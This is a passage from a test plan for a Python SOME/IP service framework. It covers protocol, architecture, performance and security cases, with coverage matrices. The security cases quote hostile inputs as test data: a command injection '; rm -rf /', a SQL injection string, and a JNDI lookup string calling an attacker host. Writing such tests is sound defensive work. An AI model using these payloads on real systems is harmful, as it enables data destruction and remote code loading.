  - Steps: Start all services simultaneously; measure SD convergence time.
  - Expected: All services discover each other within 30 seconds; SD traffic remains reasonable; no broadcast storms.

**Security & Robustness Case Catalogue - Method and Interceptor**

- SEC-001 Malicious SOME/IP Packet Injection
  - Preconditions: Subscriber listening.
  - Steps: Inject crafted SOME/IP packets with:
    - Buffer overflow payloads
    - Malformed headers
    - Replay attacks
    - Invalid service IDs
  - Expected: All malicious packets rejected; no crashes; security events logged; normal traffic unaffected.

- SEC-M-001 RPC Method Parameter Injection Attack
  - Preconditions: Service with RPC method that accepts string parameters.
  - Steps: 
    1. Call method with SQL injection payload: `; DROP TABLE users --`
    2. Call with command injection: `; rm -rf /`
    3. Call with JSON injection: `{"admin": true}`
  - Expected: Parameters treated as data, not code; no injection vulnerabilities; payloads logged safely without execution.

- SEC-M-002 RPC Response Deserialization Bomb
  - Preconditions: Service returns data controlled by attacker.
  - Steps: Return ZIP bomb (extremely compressed data that expands to GB when decompressed).
  - Expected: Deserialization limits enforced; decompression stopped after threshold; MemoryError handled gracefully; DoS prevented.

- SEC-M-003 RPC Request Flooding (DoS)
  - Preconditions: Service with rate limiting disabled initially.
  - Steps: Flood service with 10000 RPC calls per second.
  - Expected: Without rate limiting: service may degrade; with RateLimit interceptor: requests queued/rejected with 429; system remains responsive.

- SEC-I-001 Interceptor Injection Attack
  - Preconditions: Interceptor chain with user-supplied interceptor configuration.
  - Steps: Attempt to inject malicious interceptor class name or bytecode.
  - Expected: Interceptor classes validated; only whitelisted interceptors loaded; injection attempt logged and rejected.

- SEC-I-002 Tracing Context Injection (log4shell-like)
  - Preconditions: TracingInterceptor embeds trace_id in logs.
  - Steps: Inject payload in trace_id: `${jndi:ldap://attacker.com/evil}`.
  - Expected: Trace ID treated as data; not evaluated; embedded safely in logs; JNDI/command execution prevented.

- SEC-I-003 Auth Interceptor Bypass
  - Preconditions: Service with Auth interceptor protecting RPC method.
  - Steps:
    1. Call without token (should fail).
    2. Call with invalid token (should fail).
    3. Call with expired token (should fail).
    4. Attempt to bypass via interceptor order manipulation (move Auth later in chain).
  - Expected: Auth checked consistently; no bypass possible; order manipulation detected/prevented; unauthorized calls always rejected.

- SEC-002 Service Discovery Spoofing Attack
  - Preconditions: Active SD protocol.
  - Steps: Send fake SD announcements for existing services with different endpoints.
  - Expected: Legitimate services not affected; spoofed announcements detected and ignored; security alerts generated.

- SEC-003 Resource Exhaustion (DoS) Test
  - Preconditions: EventBus running.
  - Steps: Flood bus with:
    - Rapid subscription requests
    - Large payloads
    - High-frequency publications
  - Expected: Rate limiting activated; legitimate traffic prioritized; system remains responsive; resource usage bounded.

- SEC-004 Memory Exhaustion Protection
  - Preconditions: EventBus with limited heap.
  - Steps: Attempt to subscribe to 10,000 unique topics; publish 1GB payloads.
  - Expected: Memory usage monitored; connections throttled; graceful rejection of excessive requests; no OOM crashes.

**Protocol Mapping & Integration Tests (TinySOA ↔ pysomeip)**

- PROTO-MAP-001 Exception to Return Code Mapping
  - Preconditions: Service method raises specific exceptions.
  - Steps: 
    1. Call non-existent method → Expect Return Code 0x03 (E_UNKNOWN_METHOD).
    2. Service raises generic Exception → Expect Return Code 0x01 (E_NOT_OK).
    3. Service raises MalformedMessageError → Expect Return Code 0x09 (E_MALFORMED_MESSAGE).
  - Expected: Application exceptions correctly mapped to standard SOME/IP return codes in the header.

- PROTO-CFG-001 Transport Layer Selection
  - Preconditions: Service configured with `protocol="tcp"`.
  - Steps: Start service; Client connects.
  - Expected: Underlying transport uses TCP socket; large payloads supported; connection oriented behavior verified.

- PROTO-SD-INT-001 Lifecycle to SD Mapping
  - Preconditions: Service registered but not started.
  - Steps: 
    1. Verify no SD Offer sent.
    2. Call `bus.start()`.
    3. Verify SD Offer sent immediately.
    4. Call `bus.stop()`.
    5. Verify SD Stop Offer (TTL=0) sent.
  - Expected: Framework lifecycle events strictly control SD protocol messages.

**SOME/IP Advanced Protocol Features**

- PROTO-001 SOME/IP Header Validation
  - Preconditions: Service listening for SOME/IP messages.
  - Steps: Send packets with various SOME/IP header configurations:
    1. Valid header: magic (0xFFFF), length, service_id, method_id, client_id, session_id, protocol version.
    2. Invalid header: wrong magic, corrupted length field, invalid protocol version.
  - Expected: Valid headers processed; invalid rejected with error log; parsing robust.

- PROTO-002 SOME/IP Return of Service (RxSD)
  - Preconditions: Service discovery enabled; client sends Find, server sends RxSD (SD Offer in response).
  - Steps:
    1. Client sends SD FindService for service_id=0x1234.
    2. Server responds with RxSD containing endpoint (IP, port).
    3. Verify response routing (unicast back to client).
  - Expected: RxSD sent directly to client's IP:port (not broadcast); endpoint reachable; connection succeeds.

- PROTO-003 SOME/IP Session and Sequence Management
  - Preconditions: Multiple clients communicating with same server.
  - Steps:
    1. Client A: session_id=0x0001, sequence 1,2,3...
    2. Client B: session_id=0x0002, sequence 1,2,3...
    3. Server responds with matching session/sequence.
  - Expected: Sessions isolated; sequences never collide; responses correctly routed to original client.

- PROTO-004 SOME/IP Method and Event Multiplexing on Same Port
  - Preconditions: Service with method_id=0x0001 and event_id=0x0001 in different eventgroups.
  - Steps:
    1. Invoke method 0x0001 (RPC request).
    2. Simultaneously, publish event 0x0001 (event notification).
    3. Receive both on same port.
  - Expected: Requests/responses and events properly demultiplexed by header fields; no crosstalk; both delivered correctly.

- PROTO-005 SOME/IP Eventgroup Subscription (SD Subscribe)
  - Preconditions: Client wants to subscribe to eventgroup.
  - Steps:
    1. Client sends SD Subscribe with service_id, instance_id, eventgroup_id, IP, port.
    2. Server responds with SubscribeAck or SubscribeNack.
    3. Client receives event notifications at subscribed endpoint.
  - Expected: Subscription state tracked on server; notifications sent only to subscribed clients; ACK/NACK semantics correct.

- PROTO-006 SOME/IP Eventgroup Multi-Client Subscription
  - Preconditions: Two independent clients subscribe to same eventgroup.
  - Steps:
    1. Client A subscribes to eventgroup E.
    2. Server publishes event E.
    3. Client B subscribes to eventgroup E.
    4. Server publishes event E again.
  - Expected: Event E delivered to A (immediate); A and B both receive second event; subscription counts tracked.

- PROTO-007 SOME/IP Endpoint Address Update (Dynamic Port)
  - Preconditions: Service initially at port 30490.
  - Steps:
    1. Client discovers service at port 30490.
    2. Service restarts on port 30491.
    3. SD sends new Offer with updated port.
    4. Client detects change; reconnects to new port.
  - Expected: Client cache updated; new connections to updated port; old connections gracefully closed; no message loss during transition.

- PROTO-008 SOME/IP Eventgroup TTL and Re-subscription
  - Preconditions: Eventgroup subscription with TTL=10s.
  - Steps:
    1. Client subscribes (TTL=10s).
    2. Wait 8s (before expiry).
    3. Server publishes event (should be received).
    4. Wait 3s more (TTL expired).
    5. Server publishes event (should not be received).
  - Expected: TTL enforced; subscription auto-expires; client must re-subscribe; events post-TTL not delivered.

- PROTO-009 SOME/IP Version Compatibility
  - Preconditions: Two service instances: v1.0 and v2.0 of same service.
  - Steps:
    1. Client requests v1.0 (major_version=1, minor_version=0).
    2. Client requests v2.0 (major_version=2, minor_version=0).
    3. Client requests v1.1 (intermediate version, may not exist).
  - Expected: Correct version instance selected; version mismatch errors clear; version negotiation robust.

- PROTO-010 SOME/IP Concurrent Method and Event on Same Connection
  - Preconditions: Service with method_id=0x0001 and eventgroup with event.
  - Steps:
    1. Client subscribes to eventgroup.
    2. Simultaneously, invoke method and receive events on same TCP/UDP socket.
  - Expected: Requests, responses, and events all multiplexed correctly; session/sequence numbers prevent confusion; no ordering violations.

**Architecture Feature Validation**

- ARCH-001 Configuration Hot Reload Test
  - Preconditions: EventBus running with initial topic mappings.
  - Steps:
    1. Modify mapping configuration (add/remove/update topics).
    2. Trigger configuration reload.
    3. Verify new mappings active without restart.
  - Expected: New mappings take effect immediately; existing connections unaffected; invalid configs rejected gracefully.

- ARCH-001-RPC Configuration Reload for Methods
  - Preconditions: Service with registered methods; configuration file specifies method timeouts and retries.
  - Steps:
    1. Start service with method_timeout=500ms, max_retries=2.
    2. Update config to method_timeout=1000ms, max_retries=3.
    3. Trigger hot reload; make RPC call.
  - Expected: New timeout/retry settings applied without restart; in-flight requests complete with old settings; new requests use new settings.

- ARCH-002 Service Health Monitoring Integration
  - Preconditions: EventBus with health check endpoints enabled.
  - Steps:
    1. Query health status via HTTP endpoint.
    2. Simulate service degradation (SD failure, high error rate).
    3. Verify health status reflects actual state.
  - Expected: Health endpoint returns accurate status; metrics exported to Prometheus format; alerts triggered on degradation.

- ARCH-002-RPC Health and Circuit Breaker Status
  - Preconditions: Service with circuit breaker enabled; health monitoring active.
  - Steps:
    1. Monitor health endpoint while instance is healthy (success_rate > 95%).
    2. Degrade instance (error_rate increases to 90%).
    3. Circuit breaker opens; monitor health status.
  - Expected: Health status reflects success/error rates; circuit breaker state (OPEN/HALF_OPEN/CLOSED) visible in metrics; health recovers after instance stabilizes.

- ARCH-003 Interceptor Chain Functionality
  - Preconditions: EventBus with custom interceptors registered.
  - Steps:
    1. Register pre/post-publish interceptors.
    2. Register subscription interceptors.
    3. Verify interceptors called in correct order.
    4. Test interceptor failure handling.
  - Expected: Interceptor chain executed correctly; failure in one interceptor doesn't break chain; context propagated.

- ARCH-003-Extended Interceptor Chain with Method Calls
  - Preconditions: Service with 5 interceptors: Tracing → Auth → RateLimit → Caching → Retry.
  - Steps:
    1. Make method call; trace execution path.
    2. Simulate interceptor failure (Auth fails with 403).
    3. Verify remaining interceptors (Caching, Retry) not invoked.
    4. Test short-circuit behavior (cache hit skips Retry and RPC).
  - Expected: Execution order correct; short-circuit works; failure isolated; error propagated with context.

- ARCH-004 Plugin System Validation
  - Preconditions: tinySOA with plugin framework enabled.
  - Steps:
    1. Load custom plugins for serialization, discovery, monitoring.
    2. Verify plugins integrated into EventBus lifecycle.
    3. Test plugin hot-loading/unloading.
  - Expected: Plugins extend functionality seamlessly; hot-loading works without restart; plugin failures isolated.

- ARCH-004-Extended Custom RPC Codec Plugin
  - Preconditions: Plugin system enabled; custom serialization plugin for Method parameters.
  - Steps:
    1. Implement custom codec for Protobuf serialization.
    2. Register codec plugin; reload configuration.
    3. Make RPC call with Protobuf-encoded parameters.
  - Expected: Custom codec used transparently; Protobuf messages serialized/deserialized correctly; fallback to default if codec unavailable.

- ARCH-005 Service Dependency Management
  - Preconditions: Multiple services with declared dependencies.
  - Steps:
    1. Start services in dependency order.
    2. Stop dependency service, verify dependent services handle gracefully.
    3. Restart dependency, verify automatic reconnection.
  - Expected: Dependency resolution works correctly; circuit breakers engage on failure; automatic recovery on restoration.

- ARCH-005-Extended RPC Method Dependency Injection
  - Preconditions: Service method depends on another service's method; dependency injection framework enabled.
  - Steps:
    1. Method A depends on Method B (from different service).
    2. Start both services.
    3. Call Method A; verify Method B is invoked transparently.
    4. Stop service providing Method B; call Method A.
  - Expected: Dependency injected correctly; Method B accessible in Method A; timeout/retry applied to dependent call; degradation graceful.

- ARCH-006 Internal Event Bus Integration
  - Preconditions: tinySOA with internal event system.
  - Steps:
    1. Subscribe to internal events (SERVICE_READY, INSTANCE_DISCOVERED).
    2. Start/stop services, verify events fired.
    3. Test event correlation and tracing.
  - Expected: Internal events fired correctly; external systems can react to internal state changes; event history maintained.

- ARCH-006-Extended RPC Lifecycle Events
  - Preconditions: Internal event bus; method lifecycle events enabled.
  - Steps:
    1. Subscribe to internal events: METHOD_REGISTERED, METHOD_CALLED, METHOD_COMPLETED, METHOD_FAILED.
    2. Register new method at runtime; call it; verify events fired.
  - Expected: Events contain method_id, caller context, latency, error info; events correlatable with distributed tracing; event ordering preserved.

**Non-Functional Requirements Testing**

- NFR-001 Memory Usage Constraints
  - Baseline: EventBus should consume < 50MB heap for 100 topics with 1000 subscribers.
  - Test: Monitor heap usage over 24 hours; verify no memory leaks; measure growth rate.
  - Acceptance: Heap growth < 1MB/hour; resident memory < 100MB; no memory leaks detected.

- NFR-001-Extended RPC Method Memory Overhead
  - Baseline: Each registered method should consume < 10KB memory (metadata + proxy).
  - Test: Register 1000 methods; measure memory per method; check for leaks over 24 hours.
  - Acceptance: Per-method overhead < 10KB; total < 10MB for 1000 methods; no growth with repeated calls.

- NFR-002 CPU Performance Requirements  
  - Baseline: Message processing should consume < 5% CPU at 1000 msg/sec throughput.
  - Test: Measure CPU usage under various loads using profiling tools.
  - Acceptance: CPU usage scales linearly with load; no CPU hotspots; efficient async processing.

- NFR-002-Extended RPC Latency and CPU Profile
  - Baseline: RPC call latency p99 < 50ms (local loopback); CPU < 2% per 1000 calls/sec.
  - Test: Profile RPC call path; measure CPU time in each component (serialization, socket, deserialization).
  - Acceptance: Serialization < 20% of latency; network < 30%; deserialization < 20%; overhead < 30%.

- NFR-003 Network Bandwidth Efficiency
  - Baseline: Protocol overhead should be < 20% of payload size.
  - Test: Measure wire-level traffic vs. application payload.
  - Acceptance: SOME/IP overhead minimal; SD traffic bounded; no unnecessary retransmissions.

- NFR-003-Extended RPC Protocol Efficiency
  - Baseline: RPC request/response overhead < 12 bytes (SOME/IP header + session ID).
  - Test: Capture wire traffic; measure min header size.
  - Acceptance: Small payload (e.g., 1 byte) results in ~20 bytes wire traffic; efficiency ratio > 90% for large payloads (> 1KB).

- NFR-004 Startup Time Performance
  - Baseline: EventBus should start within 5 seconds with 100 pre-configured topics.
  - Test: Measure initialization time components: SD startup, port allocation, service binding.
  - Acceptance: Cold start < 5s; warm start < 2s; parallel initialization where possible.

- NFR-004-Extended Service Registration Throughput
  - Baseline: Register 1000 methods and 100 services in < 2 seconds.
  - Test: Measure time to register services and methods at startup.
  - Acceptance: < 2 seconds for 1000 methods; linear scaling; SD Offer sent within 100ms of registration.

- NFR-005 Fault Recovery Time (MTTR)
  - Baseline: Service recovery should complete within 30 seconds after failure.
  - Test: Simulate various failure modes; measure time to full service restoration.
  - Acceptance: Network failures recovered in < 30s; service crashes recovered in < 10s; data consistency maintained.

- NFR-005-Extended RPC Failover MTTR
  - Baseline: Failed RPC call should failover to another instance within 1 second.
  - Test: Kill instance handling request; measure time to retry on new instance.
  - Acceptance: Failover < 1 second; automatic without manual intervention; all instances in pool tried before final error.

- NFR-006 Scalability Limits
  - Baseline: Support 1000 topics, 10000 subscribers, 100 publishers per EventBus instance.
  - Test: Gradually increase load until performance degradation observed.
  - Acceptance: Linear scaling up to limits; graceful degradation beyond limits; clear error messages at capacity.

- NFR-006-Extended RPC Concurrency Limits
  - Baseline: Support 10000 concurrent RPC calls per service instance.
  - Test: Launch increasing concurrent RPC load; measure throughput and latency.
  - Acceptance: Linear throughput up to 10000 calls/sec; p99 latency stable; resource usage bounded.

**Traceability**

### RPC Method Tests
- Method Invocation: TC-M-001 through TC-M-015 → [design/03-api-design.md](design/03-api-design.md) Section 4 (Method Definition and Proxy)
- Method RPC Lifecycle: ST-M-001 through ST-M-010 → [design/04-lifecycle.md](design/04-lifecycle.md), [design/02-core-components.md](design/02-core-components.md) Section 3 (Service Proxy)
- Method Concurrency: TC-M-010, TC-M-011 → [design/02-core-components.md](design/02-core-components.md) Section 2 (Connection Manager - Session Management)

### Interceptor Chain Tests
- Interceptor Execution: TC-I-001 through TC-I-008, TC-B-001 through TC-B-009 → [design/05-interceptors-plugins.md](design/05-interceptors-plugins.md) Section 1-2
- Built-in Interceptors: TC-B-001 through TC-B-009 → [design/05-interceptors-plugins.md](design/05-interceptors-plugins.md) Section 2 (Logging, Metrics, Tracing, Auth, RateLimit, Retry, Caching)
- Observability/Tracing: ST-I-001 through ST-I-005 → [design/07-monitoring-tracing.md](design/07-monitoring-tracing.md)

### Load Balancing & Failover Tests
- Load Balancer Strategies: TC-LB-001 through TC-LB-008, ST-M-007 → [design/02-core-components.md](design/02-core-components.md) Section 3.4 (Load Balancer Design)
- Health Score & Failover: TC-LB-004 through TC-LB-007 → [design/02-core-components.md](design/02-core-components.md) Section 3.4.1 (Health Score and Instance Selection)

### Eventgroup & Subscription Tests (Enhanced)
- Eventgroup Management: TC-EG-001 through TC-EG-010 → [design/03-api-design.md](design/03-api-design.md) Section 4.2 (subscribe method), [design/09-internal-event-model.md](design/09-internal-event-model.md)
- Event Streaming: TC-EG-003, TC-EG-005, TC-EG-008 → [design/04-lifecycle.md](design/04-lifecycle.md) Event emission and subscription lifecycle
- Event Bus Integration: TC-EG-010, ARCH-006, ARCH-006-Extended → [design/01-overview.md](design/01-overview.md) Event Bus component, [design/09-internal-event-model.md](design/09-internal-event-model.md)

### Security & Advanced Protocol Tests
- RPC Method Security: SEC-M-001 through SEC-M-003 → Parameter validation, serialization safety
- Interceptor Security: SEC-I-001 through SEC-I-003 → [design/05-interceptors-plugins.md](design/05-interceptors-plugins.md), Authentication/Authorization
- SOME/IP Protocol Features: PROTO-001 through PROTO-010 → [pysomeip/src/someip/header.py](../src/someip/header.py), [pysomeip/src/someip/sd.py](../src/someip/sd.py)
- Service Discovery Protocol: PROTO-002, PROTO-005, PROTO-006, PROTO-008 → SOME/IP-SD RFC

### Architecture Feature Validation
- Configuration Hot Reload: ARCH-001, ARCH-001-RPC → [design/06-configuration.md](design/06-configuration.md)
- Service Health & Circuit Breaker: ARCH-002, ARCH-002-RPC → [design/07-monitoring-tracing.md](design/07-monitoring-tracing.md)
- Interceptor Chain: ARCH-003, ARCH-003-Extended → [design/05-interceptors-plugins.md](design/05-interceptors-plugins.md)
- Plugin System: ARCH-004, ARCH-004-Extended → [design/05-interceptors-plugins.md](design/05-interceptors-plugins.md) Section 2 (Plugin System)
- Service Dependency: ARCH-005, ARCH-005-Extended → [design/04-lifecycle.md](design/04-lifecycle.md) Dependency Management
- Internal Events: ARCH-006, ARCH-006-Extended → [design/09-internal-event-model.md](design/09-internal-event-model.md)

### Non-Functional Requirements
- Memory: NFR-001, NFR-001-Extended → Performance requirements
- CPU: NFR-002, NFR-002-Extended → Performance profiling
- Network: NFR-003, NFR-003-Extended → Protocol efficiency
- Startup: NFR-004, NFR-004-Extended → Initialization performance
- Recovery: NFR-005, NFR-005-Extended → Fault tolerance
- Scalability: NFR-006, NFR-006-Extended → Load and concurrency limits

### Original Mapping/Event Bus Tests
- Mapping/API: TC-001, TC-010, TC-017, TC-020 → [design/03-api-design.md](design/03-api-design.md)
- Lifecycle: TC-004, TC-005, TC-007, TC-011, TC-015, TC-016 → [design/04-lifecycle.md](design/04-lifecycle.md)
- Event Model: TC-003, TC-006, TC-013, ARCH-006 → [design/09-internal-event-model.md](design/09-internal-event-model.md)
- Configuration/Ports: TC-008, TC-018, TC-022, ARCH-001 → [design/06-configuration.md](design/06-configuration.md)
- Observability/Errors: TC-006, TC-012, TC-025, ARCH-002 → [design/07-monitoring-tracing.md](design/07-monitoring-tracing.md)
- Concurrency: TC-019, TC-020, TC-021, TC-023 → Core threading model
- Security: SEC-001 through SEC-004 → Security requirements
- Architecture: ARCH-001 through ARCH-006 → [design/01-overview.md](design/01-overview.md)
- Performance: NFR-001 through NFR-006, ST-007, ST-009 → Performance requirements

**Test Environment Requirements**

**Infrastructure Setup**
- Linux environment with network namespace isolation support
- Docker containers for multi-instance testing
- Python 3.9+ with asyncio support
- Network simulation tools: `tc` (traffic control), `iptables`
- Monitoring stack: Prometheus, Grafana, cAdvisor
- Load testing tools: custom Python scripts, `siege` for HTTP endpoints

**Test Data Configuration**
```yaml
test_datasets:
  small_payload: 1KB JSON objects
  medium_payload: 64KB binary data  
  large_payload: 1MB structured data
  concurrent_users: [1, 10, 100, 1000]
  network_conditions:
    - normal: 0ms delay, 0% loss
    - degraded: 100ms delay, 1% loss
    - poor: 500ms delay, 5% loss
```

**Automated Test Pipeline**
```yaml
test_stages:
  unit_tests:
    timeout: 5 minutes
    parallel: true
    coverage: > 85%
  
  integration_tests:  
    timeout: 15 minutes
    environment: docker-compose
    dependencies: [unit_tests]
    
  system_tests:
    timeout: 60 minutes
    environment: kubernetes  
    dependencies: [integration_tests]
    
  performance_tests:
    timeout: 120 minutes
    environment: dedicated_hw
    schedule: nightly
    
  stability_tests:
    timeout: 24 hours
    environment: production_like
    schedule: weekend
```

**Monitoring and Observability**
- **Metrics Collection**: Prometheus endpoints for all test metrics
- **Log Aggregation**: Centralized logging with structured JSON format  
- **Trace Correlation**: OpenTelemetry integration for distributed tracing
- **Alert Rules**: Automated alerts for test failures, performance degradation
- **Dashboard**: Real-time test execution dashboard with key indicators

**Acceptance Criteria**
- **Functional Coverage**: Each case states clear Preconditions, Steps, Expected Results tied to design requirements.
- **Comprehensive Coverage**: Test suite spans mapping, lifecycle, SD parameters, delivery, sequencing, error handling, port allocation, concurrency, security, and architecture features.
- **Performance Validation**: Non-functional requirements verified with quantitative metrics and benchmarks.
- **Production Readiness**: Long-term stability tests demonstrate system reliability under realistic workloads.
- **Security Assurance**: Security tests validate protection against common attack vectors and resource exhaustion.
- **Automation Ready**: All test cases designed for automated execution with clear pass/fail criteria.
- **Observability**: Full monitoring and tracing integration for production deployment confidence.
- **Scalability Proof**: Load testing demonstrates system behavior under various scaling scenarios.

**Notes**
- Associated paths: tiny SOA sources [tinySOA/src/tinysoa](tinySOA/src/tinysoa), design folder [design](design).
- Future work: Add integration and performance tests once environment is available.

**Test Coverage Matrix**

```
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ SOME/IP Framework Feature Coverage Analysis                                                        │
├──────────────────┬──────────┬───────────────────┬──────────┬──────────┬──────────┬────────────────┤
│ Feature Area     │ Unit     │ Integration/System│ Security │ Arch     │ NFR      │ Total Tests    │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ RPC Methods      │ 15 (M)   │ 10 (M)            │ 3 (M)    │ 2 (M-Ext)│ 2 (M-Ext)│ 32 tests       │
│                  │ TC-M-*   │ ST-M-*            │ SEC-M-*  │ ARCH-*   │ NFR-*    │                │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ Interceptors     │ 8 + 9(B) │ 5 (I)             │ 3 (I)    │ 2 (I-Ext)│ N/A      │ 27 tests       │
│                  │ TC-I-*   │ ST-I-*            │ SEC-I-*  │ ARCH-*   │          │                │
│                  │ TC-B-*   │                   │          │          │          │                │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ Load Balancing   │ 8 (LB)   │ 1 (LB)            │ N/A      │ N/A      │ 1 (LB-Ex)│ 10 tests       │
│                  │ TC-LB-*  │ ST-M-007          │          │          │ NFR-*    │                │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ Eventgroups      │ 10 (EG)  │ N/A (in original)│ N/A      │ 1 (EG)   │ N/A      │ 11 tests       │
│                  │ TC-EG-*  │ ST-001-010       │          │ ARCH-006 │          │                │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ SOME/IP Protocol │ N/A      │ N/A               │ 1 (Proto)│ N/A      │ N/A      │ 10 tests       │
│                  │          │                   │ SEC-001  │          │          │ PROTO-001-010  │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ Original Tests   │ 29       │ 10                │ 4        │ 6        │ 6        │ 55 tests       │
│ (EventBus Pub/Sub)│ TC-001-29│ ST-001-010       │ SEC-001-4│ ARCH-*   │ NFR-*    │                │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ Total New Tests  │ 50       │ 16                │ 7        │ 4-Ext    │ 3-Ext    │ 90+ NEW tests  │
├──────────────────┼──────────┼───────────────────┼──────────┼──────────┼──────────┼────────────────┤
│ TOTAL COVERAGE   │ 79       │ 26+55             │ 15       │ 6+4+6    │ 6+3      │ 155+ tests     │
└──────────────────┴──────────┴───────────────────┴──────────┴──────────┴──────────┴────────────────┘

Key Coverage Areas:
✓ RPC Method Invocation (Request/Response + Fire-and-Forget)
✓ Interceptor Chain (7 position categories x 9 built-in interceptors)
✓ Load Balancing (3 strategies + health scoring + failover)
✓ Eventgroup Subscription (multi-client, filtering, history, TTL)
✓ SOME/IP Protocol (headers, session, multiplexing, SD, TTL, versioning)
✓ Security (parameter injection, DoS, auth, serialization attacks)
✓ Observability (Tracing, Metrics, Logging, Health Monitoring)
✓ Performance (latency, throughput, CPU, memory, startup)
✓ Reliability (fault recovery, circuit breaker, configuration reload)
✓ Scalability (10K+ concurrent calls, 1000+ services, 10K+ subscribers)
```

**Enhanced Feature Coverage by Component**

| Component | Coverage | Key Test Cases | Status |
|-----------|----------|-----------------|--------|
| **RPC Methods** | 100% | TC-M-001~015 (unit), ST-M-001~010 (system) | NEW |
| **Interceptor Chain** | 100% | TC-I-001~008, TC-B-001~009, ST-I-001~005 | NEW |
| **Load Balancer** | 100% | TC-LB-001~008, ST-M-007 | NEW |
| **Eventgroup** | 90% | TC-EG-001~010, original ST tests | ENHANCED |
| **SOME/IP Protocol** | 95% | PROTO-001~010, SEC-M/I, original tests | NEW |
| **Service Discovery** | 95% | PROTO-002/005/006/008, original SD tests | ENHANCED |
| **Observability** | 90% | ST-I-001~005, TC-B-001~009, original tests | ENHANCED |
| **Security** | 85% | SEC-001~004, SEC-M-001~003, SEC-I-001~003 | ENHANCED |
| **Performance** | 90% | NFR-001~006 (original) + RPC/LB extensions | ENHANCED |
| **Architecture** | 95% | ARCH-001~006 + extended versions | ENHANCED |

**SOME/IP Feature Checklist**

- [x] Request/Response Method Call (RPC) - TC-M-002, ST-M-001~010
- [x] Fire-and-Forget Method (One-Way) - TC-M-003, ST-M-009
- [x] Event Notification & Subscription - TC-EG-001~010, PROTO-005~008
- [x] Service Discovery (Offer/Find/Subscribe) - PROTO-002, PROTO-005, PROTO-006, PROTO-008
- [x] Session Management & Sequence Numbers - TC-M-013, PROTO-003, PROTO-004
- [x] Method Timeout & Retry - TC-M-006, ST-M-005, TC-B-007
- [x] Load Balancing & Failover - TC-LB-001~008, ST-M-007
- [x] Version Negotiation - TC-M-015, ST-M-010, PROTO-009
- [x] Parameter Serialization - TC-M-004, TC-M-005, TC-M-014
- [x] Error Response Handling - TC-M-009, TC-M-007
- [x] Concurrent Requests - TC-M-010, TC-M-011, TC-020, ST-M-004
- [x] Large Payload Handling - TC-M-014, ST-M-003, TC-EG-009
- [x] Event History/Retransmission - TC-EG-005, PROTO-008
- [x] Multi-instance Subscription - TC-EG-006, PROTO-006
- [x] Port Multiplexing - PROTO-004, PROTO-010
- [x] TTL Management - TC-EG-008, PROTO-008
- [x] Response Routing - PROTO-002 (RxSD)
- [x] Interceptor Integration - TC-I-001~008, TC-B-001~009, ST-I-001~005
- [x] Health Monitoring - TC-LB-004, TC-LB-005, ARCH-002-RPC, TC-B-001
- [x] Circuit Breaker - ST-I-004, ARCH-002-RPC

**Post-Test Validation Checklist**

- [ ] All test cases implemented and passing
- [ ] Code coverage > 85% for core modules (service proxy, interceptor chain, load balancer)
- [ ] End-to-end test scenarios verified with real network
- [ ] Performance benchmarks meet NFR targets
- [ ] Security penetration testing completed
- [ ] Distributed tracing end-to-end working
- [ ] Load balancing strategies validated with multi-instance
- [ ] Fault recovery < MTTR targets
- [ ] Memory leaks checked with valgrind/heapy
- [ ] Documentation complete with examples for each major feature

**Notes**
- Associated paths: tiny SOA sources [tinySOA/src/tinysoa](tinySOA/src/tinysoa), design folder [design](design).
- Future work: Add integration and performance tests once environment is available.